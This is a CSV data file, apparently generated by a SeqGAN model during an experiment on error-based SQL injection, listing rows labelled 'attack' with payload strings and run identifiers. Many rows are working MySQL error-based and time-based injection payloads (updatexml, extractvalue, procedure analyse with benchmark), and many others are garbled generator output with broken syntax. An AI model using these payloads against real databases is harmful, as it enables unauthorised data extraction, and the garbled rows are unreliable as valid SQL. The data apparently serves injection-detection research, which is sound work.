attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  'kfbblolede  (  elt  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  1297  =  (  (  selectt0 0 from d dual  )  )   end  (   (  extractvalue  (  (  (  9627,concat  (  (  3393  (  (  0x2e,0x7171706a71,  (  select   (  elt  elt  (  0x5c)  (  (  (  (  0x5c,md5  (  (  7982  =  (  (  (  1808  =  (  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1403
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1404
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1405
attack,"1%""   )    )    AND   (  extractvalue  (  (  (  (  (  9627,concat  (  (  =  (  (  (  (  (  (  (  5000000,m(  (  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  (  (  0x2e,0x7171706a71,  (  select   (  e  (  elt  (  eltal  )  /  (  (  (  0x2e,(  (  select   (  elt  (  elt  (  0x2e,md5  (  0x5c,  (  (  2917,concat  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1406
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  'nciosn""   (    AND AND 5322  1812  (  (  el_nt  =  1808,1   )    5  extractvalue  (  (  1297,  (  (  benchmark  (  (  6461  =  (  3393,,1   (  9490  (  (  0x2e,0x7171706a71,  (  (  select 0 0 from d  (  (  elt  )   e  (  (  elt  (  e  (  1297  =  1759(  (  5000000,md5  (  =  (  (  7982  =  (  3393,1   fromdu",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1407
attack,"1%""   )    procedure analyseddre  )    (   (  2501  (  (  elt  (  3393  =  (  (  =  (  (  3393,concat  (  (  0x2e,0x7171706a71(  extractvalue  (  benchmark  (  (  9627,md5  (  (  select   (  5777  =  (  8862,1   from dual   end  (  (  elta  elta  elt  (  5000000(  (  1808,1   )    )    ytna  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1408
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1409
attack,"1%"",case else updatexml  (   (  (  (  (  4660  )  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  (  0x5c,0x7171706a71,1   (  (  3393,  (  3393  (  2917  (  select   (  elt  (  8862  =  (  7982,  (  benchmark  (  (  5000000(  (  3393,concat  (  (  0x2e,md5  (  0x2e,  (  (  (  9627,concat  (  (  (  (  0x2e,md5  (  0x5c,  =  (  1297",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1410
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""%'  =  '      )    FROM pron bance anal  e  3393  =  AND 0 duale  )  elt  (  1297  =  1049  (  (  (  9627,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt3393  =  (  (  (  0x5c,  (  (  5000000(  (  0x5c,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1411
attack,"1%""   and extractvalue  (  (  (  3393,concat  (  select   (  )  elt  (  1049  =  (  3393,1   from dual  )   (  (  )   (  3393   (  (  el duanal  )  =  9255,concat  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  t   (  1802  (  (  0x5c,0x7171706a71,  (  extractvalue  (  (  (  9627,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1412
attack,"1% and updatexml  (  3393,concat  (  3393,concat  (  (  (  (  select   (  elt  (  e  as  (  0x2e,md5  (  0x5c,  (  (  select   (  1354  =  (  7982,1   )    )     (  select   (  case when   (  (  elta  elt  (  1808  =  7757  =  (  1808,1   from dua  elt  (  elt  (  0x5c,  (  benchmark  (  5000000(  (  3393  (  =  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1413
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""o%'  =  'zb""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1414
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1415
attack,"1%""  )   and updatexml  (  (  1808,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  (  (  select   (  )  elt  (  1297  =  (  (  1808,1   )    )  (  extractvalue  (  5  =  (  9255,concat  (  (  (  0x4b774c75   SELECT)    )    )nUST    (  updatexml  (  (  (  1808,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  1808  =  7636  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1416
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1417
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1418
attack,"1%""   procedu   e(    (   (  (   (  4660  (  (  elt  (  elt  (  1297  =  (  0x4b774c75   (  5198  (  (    (  (  0x4b774c75   )    (  extractvalue  (  (  1297,1   )    (  extractvalue  (  (  benchmark  (  5000000(  (  7982,1   (  extractvalue  (  (  1808,concat  (  (  (  0x2e,  (  =  (  (  1808,0x717a767a71  )  1161  (  (  3393,concat  (  (  (  0x52515a50   (  5847  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1419
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1420
attack,"' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'm",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1421
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1422
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1423
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1424
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1425
attack,"1"" and cast  (  (  from,1   (  (  (  )  (  elt  (  1297  =  (  3393,1   )    )  extractvalue  (  9627,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  3364  )  #)    )     )  ,  (  select   (  case when   (  (  (  elt  (  0x4b774c75   (  5433  (  (  3393,1 updatexml  (  =  (  case 0 ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1426
attack,"1 and extractvalue  (  (  (  3393,concat  (  (  (  (  (  (  (  (  9836  )  (  (  4774=  1759(  (  benchmark  (  (  5000000(  3393  =  (  (  (  (  0x2e,0x7171706a71,  (  (  (  select   (  elt  (  1808  =  (  (  7982,  (  1808,  (  =  (  3393,md5  (  3393concat  (  (  0x5c,md5  (  0x2e,  (  (  (  9627,concat  (  (  =  1808,1   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1427
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1428
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'x""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1429
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1430
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1431
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1432
attack,1%jpph'  =  'kpk'  =  'jkuddogadguganhuggngnANDn(qa,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1433
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1434
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1435
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1436
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1437
attack,"1"" and updatexml  (  (  (  3393,concat  (  (  (  0x2e,  (  (  (  select   (  elt  (  2917  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  elt a  elt  (  0x5c,0x7171706a71,  (  (  5000000,m5  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1438
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1439
attack,"1"" and extractvalue  (  3393,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  =  (  8862,1   (  (  el  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  select   (  (  e  (  elt  (  1297  =  (  (  1808  =  (  3393,  (  (  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  select   (  elt  (  1297  =  (  (  1808,concat  (  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1440
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1441
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1442
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1443
attack,"1%""   )    )     2162  )  =  1559 extractvalue  (  (  (  (  (  (  0x2e,0x7171706a71(  (  select   (  elt  (  elt  (  3393  =  1   (  extractvalue  (  (  9627  =  (  (  t  (  (  benchmark  (  9255,concat  (  (  =  (  (  1808  =  1   )    (  extractvalue  (  9255,md,0x7171706a71,  (  (  (  0x5c(  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  =  (  9255,0x52515a50",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1444
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1445
attack,"1"" and extractvalueextractvalue  (  (  (  (  (  (  (  (  (  (  (  (  (  5000000,(  (  (  benchmark  (  5000000(  (  (  3393  =  (  (  (  1802  (  9788  =  (  (  (  =  (  2162 5322  (  (  0x5c,0x7171706a71,  (  select   (  elt  )  1808  )  (  (  select   (  elt  (  7982  =  (  1 0 as d  (  (  e  ut  e a  (  elta  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1446
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1447
attack,"1%%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1448
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1449
attack,"select   (  9103  (  (  0x5c,0x7171706a71,  (  1049  (  select   (  elt  (  elt  (  1297  (  1049  =  (  (  (  (  1808  =  (  (  (  0x5c,  (  5000000(  =  (  (  3393,md5  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x5c,0x7171706a71,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  elt  (  1297  =  (  (  1297  =  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1450
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1451
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1452
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1453
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1454
attack,"select   (  8375  =  6212  (  (  3393,1   )    )     )  extractvalue  (  (  5000000,md5  (  (  0x2e,m5  (  (  (  select   (  elt  (  (  e(  elt  (  8862  =  0   (  0x5c,0x7171706a71,  (  select   (  elt  (  5198  =  4660  (  (  7982,concat  (  (  0x2e,md5  (  0x5c,  (  9255,concat  (  (  (  0x2e,0x7171706a71,  (  3393,1   )    (  extractvalue  (  1297,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1455
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%O8981}p--CendqAND pn mninamenal  (  select   (  )  elt  (  elt  (  3393  =  (  7982,concat  (  0x5c,  (  (  select   (  case 0 0 from dua  )   (  case   (  (  el  elt  7982  =  (  3393,md5  (  (  2917=  (  (    (  (  3393,concat  (  (  (  (  0x2e,  (  extractvalue  (  (  0x52515a50   (  6200  )   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1456
attack,"1%"" and extractvalue  (  (  (  3393,concat  (  0x2e,  (  =  (  (   (  7757  )  (  (  5000000(  3393  (  (  (  0x5c,  (  0x4b774c75   (  6134  (  (  el  (  1297  =  (  3393,1   (  extractvalue  (  (  9627,concat  (  (  (  0x5c,  (  benchmark  (  (  (  5000000,md5  =  (  1808,concat  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  5000000,md5  (  benchmark  (  (  3335  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1457
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1458
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1459
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1460
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1461
attack,"1%'   )    )    (    #set  (  (  1297  =  (  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  select   (  elt  (  elt  (  e  0x52515a50   )    (  1812  (  (  select   (  elt  e  (  0x2e,0x7171706a71,  (  select   (  1759,  (  (  benchmark  (  (  5000000(  (  (  0x5c,  (  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  (  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1462
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1463
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1464
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1465
attack,"1%""   )    (  extractvalue  (  9627,concat  (  (  (  (  3393  (  (  (  0x5c,(  select   (  elt  (  elt  (  7982  =  (  (  (  1808  =  (  (  3393,  (  (  5000000(  (    (  (  (  0x5c,  (  (  benchmark  (  (  (  9627,concat  (  (  (  0x5c,  (  (  (t  (  select   (  elt  1297  =  (  1 0 from)    (    (  5847  =  (  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1466
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""'  =  'k""  =  ""gj",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1467
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1468
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  ''  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1469
attack,"1%"" or extractvalue  (  (  (  (  1543  =  (  (   (  (  1808,0x78   (  5433  (  (  3393  =  3393,  (  (  select   (  elt  (  elt  (  0x4b774c75   end  (  (  elt  (  e(  elt  (  0x4b774c75   end  (   from d dual  elt  )  el  )   then 7997 extractvalue  (  (  (  (  0x2e,0x7171706a71,  (  (  0x2e,0x7171706a71,  (  (  select   (  0x5c)  5433  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1470
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'z",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1471
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1472
attack,"1%""   )    )     (  extractvalue  (  (  (  (  (  aincdel  e  )  0x2e,0x7171706a71,  (  (  (  select   (  1297  =  (  9788,1   )    (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  =  8862,1   )    )    5  (  updatexml  (  (  (  (  select   (  elt  (  elt  (  1808  =  (  (  0x5c,  (  (  5000000,mduan  0x4b774c75   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1473
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1474
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1475
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1476
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1477
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""where proceduyenanalyse annl    =  (  3393,1   )    )     (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  9627,md5  (  0x2e,0x7171706a71,  (  select   (  case 7997   (  9103  (  (  elt  (  e    (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  benchmark  (  =  (  9627,concat  (  (  (  =  (  (  e  (  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1478
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1479
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1480
